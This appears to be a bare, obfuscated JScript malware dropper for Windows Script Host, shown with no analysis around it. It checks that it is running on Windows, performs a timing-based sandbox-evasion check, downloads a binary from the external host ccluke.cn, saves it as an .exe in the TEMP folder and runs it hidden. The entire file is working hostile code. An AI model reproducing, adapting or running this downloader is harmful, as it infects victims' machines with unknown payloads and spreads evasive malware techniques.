var _SL = false;
var _WP = "CreateObject";
var _I = function _VH() {return WScript[_WP]("WScript"+".Shell");}(), _CB = 11;
var _JU = "MSXML2.XMLHTTP";
var _Z0 = 2123213;
var _S = 0;
function _Z(_QO){_I["Run"](_QO, _S, _S);};
function _XE(){return _JU + "";};
function _C0(_JM, _WE){_S = _S * 1; return _JM - _WE;};
function _ID(){return _WP;};
/*@cc_on
  @if (@_win32 || @_win64)
    _SL = true;
  @end
@*/
if (_SL)
{
var _WI = "";
function _NV(){return 22;};
var _Z1 = 0; var _Q = 0;
function _C()
{
var _G = new this["Date"]();
var _GN = _G["getUTCMilliseconds"]();
WScript["Sleep"](_NV());
var _G = new this["Date"]();
var _A = _G["getUTCMilliseconds"]();
WScript["Sleep"](_NV());
var _G = new this["Date"]();
var _H = _G["getUTCMilliseconds"]();
var _Z1 = "_T0";
_Z1 = _C0(_A, _GN);
var _Q = "_SR";
_Q = _C0(_H, _A);
_WI = "open";
return _C0(_Z1, _Q);
}
var _ZC = false;
var _F = false;
for (var _TZ = _S; _TZ < _NV() * 1; _TZ++){if (_C() != _S){
_ZC = true; 
_Q = "31" + 11 * _Z1 + _Q; 
_F = true; 
break;
}}
function _B() {return ((_ZC == true) && (_ZC == _F)) ? 1 : _S;};
if (_ZC && _B() && _F){
function _IX() {return _I["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "7gBoE706.ex" + "e";};
 _RL = _XE();
 _R = WScript[_WP](_RL);
 var _T = 1;
 while (_T){
try {
	if (_T == 1)
	{
		_R[_WI]("GET", "http://ccluke.cn/b7eus", false);
		_R["send"]();
		_CX = "Sleep";
	}
	WScript[_CX](_NV() + 120); 
	if (_R["readystate"] < 2 * 2) continue;
	_T = _S;
	function _VL(_OB) {var _V = (1, 2, 3, 4, 5, _OB); return _V;};
	_M = WScript[_ID()]("ADODB.Stream");
	_RL = _M;
	_RL[_WI]();
	_RL["type"] = _VL(1);
	_RL["write"](_R["ResponseBody"]);
	_M["position"] = _VL(_S);
	_RL["Save" + "ToFile"](_IX(), 2);
	_M["cl"+"ose"]();
	_O = _IX();
	_Z(_O);
} catch(_CW){};
}
}
}

